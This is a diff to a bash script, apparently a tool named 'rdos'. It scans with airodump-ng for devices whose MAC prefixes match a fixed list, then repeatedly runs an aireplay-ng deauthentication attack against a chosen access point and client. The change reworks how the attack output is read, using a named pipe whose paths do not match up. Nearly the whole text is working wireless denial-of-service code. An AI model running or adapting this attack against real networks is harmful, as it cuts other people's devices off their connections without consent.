@@ -135,7 +135,10 @@ if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/
         case "$choice1" in
             [Yy]*)
                 sudo rm -r /tmp/rdos*
-                airodump_scan
+                # airodump_scan
+                printf 'Executing airodump-ng..\nPress Ctrl+C to stop the capture and press the A key to cycle between modes while viewing\n'
+                sleep 3; clear
+                sudo airodump-ng -i $INF --manufacturer -w /tmp/rdos/airodump --output-format csv
                 if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/$RESULT; then
                     break
                 fi
@@ -168,7 +171,10 @@ sudo airmon-ng stop $INF
 sudo airmon-ng start $ITMP $CHNL
 clear
 
-# sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty | while read -r aireout; do 
+
+# while true; do
+#     aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty)
+    
 #     if echo "$aireout" | grep -q "No such BSSID available"; then
 #         while true; do
 #             read -p "Would you like to run aireplay-ng again?[y/n]: " choice2
@@ -189,14 +195,19 @@ clear
 #                     printf "Invalid choice. Please enter 'y' or 'n'.\n"
 #             esac
 #         done
+#     else
+#         break
 #     fi
 # done
 
-# custom_exit
+# Create a named pipe (FIFO)
+sudo mkfifo /tmp/rdos/aireplay_output
 
-while true; do
-    aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty)
-    
+# Start aireplay-ng in the background and tee its output to the named pipe
+sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee aireplay_output &
+
+# Loop to read the live output
+while read -r aireout; do
     if echo "$aireout" | grep -q "No such BSSID available"; then
         while true; do
             read -p "Would you like to run aireplay-ng again?[y/n]: " choice2
@@ -204,11 +215,11 @@ while true; do
                 [Yy]*)
                     printf "Running aireplay-ng again...\n"
                     clear
-                    aireloopout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF)
-                    printf "$aireloopout\n"
-                    if ! echo "$aireloopout" | grep -q "No such BSSID available"; then
-                        break
-                    fi
+                    # Kill the background aireplay-ng process and close the named pipe
+                    pkill -P $$ aireplay-ng
+                    rm aireplay_output
+                    # Start aireplay-ng again with tee
+                    sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee aireplay_output &
                     ;;
                 [Nn]*)
                     custom_exit
@@ -220,8 +231,12 @@ while true; do
     else
         break
     fi
-done
+done < aireplay_output  # Read from the named pipe
+
+# Cleanup: Close the named pipe
+sudo rm /tmp/rdos/aireplay_output
 
 custom_exit
+
 
 
